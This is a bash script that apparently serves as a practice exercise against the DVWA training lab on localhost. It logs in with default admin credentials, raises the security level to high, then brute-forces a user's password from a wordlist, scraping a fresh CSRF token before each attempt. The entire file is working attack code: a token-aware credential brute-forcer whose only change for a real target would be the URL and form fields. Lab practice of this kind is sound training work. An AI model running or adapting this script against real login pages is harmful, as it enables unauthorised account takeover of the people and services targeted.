#!/bin/bash
TARGET="http://127.0.0.1:8000"
USER="pablo"
COOKIE_JAR="cookie.txt"
SECURITY_LEVEL="high"

echo "[*] get token CSRF: ..."
INIT_RESP=$(curl -s -c "$COOKIE_JAR" "$TARGET/login.php")
USER_TOKEN=$(echo "$INIT_RESP" | grep user_token | sed "s/.*value='//" | cut -d"'" -f1)
echo "[*] Token login: ${USER_TOKEN:0:10}..."

echo "[*] Login..."
curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  --data "username=admin&password=password&Login=Login&user_token=$USER_TOKEN" \
  "$TARGET/login.php" > /dev/null

echo "[*] Set security: $SECURITY_LEVEL"
SEC_PAGE=$(curl -s -b "$COOKIE_JAR" "$TARGET/security.php")
T2=$(echo "$SEC_PAGE" | grep user_token | sed "s/.*value='//" | cut -d"'" -f1)
curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  --data "security=$SECURITY_LEVEL&seclev_submit=Submit&user_token=$T2" \
  "$TARGET/security.php" > /dev/null

# Verifikasi
curl -s -b "$COOKIE_JAR" "$TARGET/security.php" | grep -i "Security Level" | head -n 2

echo "[+] Target: $TARGET/vulnerabilities/brute/ [$SECURITY_LEVEL]"
echo "-----------------------------------------------"

while read -r PASS; do
  BRUTE_PAGE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" "$TARGET/vulnerabilities/brute/")
  TOKEN_BRUTE=$(echo "$BRUTE_PAGE" | grep user_token | sed "s/.*value='//" | cut -d"'" -f1)

  RESP=$(curl -s -G \
    --data-urlencode "username=$USER" \
    --data-urlencode "password=$PASS" \
    --data-urlencode "user_token=$TOKEN_BRUTE" \
    --data-urlencode "Login=Login" \
    -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    "$TARGET/vulnerabilities/brute/")

  # WARNA MERAH UNTUK MENCOBA (FAILED)
  echo -e "\e[31m[-] Trying: $PASS\e[0m"

  if echo "$RESP" | grep -q "Welcome to the password protected area"; then
    echo ""
    # WARNA HIJAU KETIKA FOUND
    echo -e "\e[32m[+] FOUND! Password $USER: $PASS\e[0m"
    break
  fi
done < passlist.txt

rm -f $COOKIE_JAR

